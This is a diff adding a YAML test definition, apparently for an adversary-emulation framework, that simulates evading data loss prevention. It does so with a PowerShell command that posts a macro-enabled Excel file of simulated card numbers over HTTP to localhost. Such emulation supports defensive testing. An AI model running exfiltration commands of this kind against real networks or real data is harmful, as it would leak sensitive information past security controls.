@@ -1,0 +1,23 @@
+- description: 'Upon successful execution, an excel containing VBA Macro containing
+    sensitive data will be sent outside the network using HTTP.
+
+    Sensitive data includes about around 20 odd simulated credit card numbers that
+    passes the LUHN check.
+
+    '
+  id: 7b6d0acc-aab6-330d-701d-ea8f4d7d96d4
+  name: DLP Evasion via Sensitive Data in VBA Macro over HTTP
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body "9070cd_T1027-cc-macro.xlsm"
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads:
+        - 9070cd_T1027-cc-macro.xlsm
+  tactic: defense-evasion
+  technique:
+    attack_id: T1027
+    name: Obfuscated Files or Information
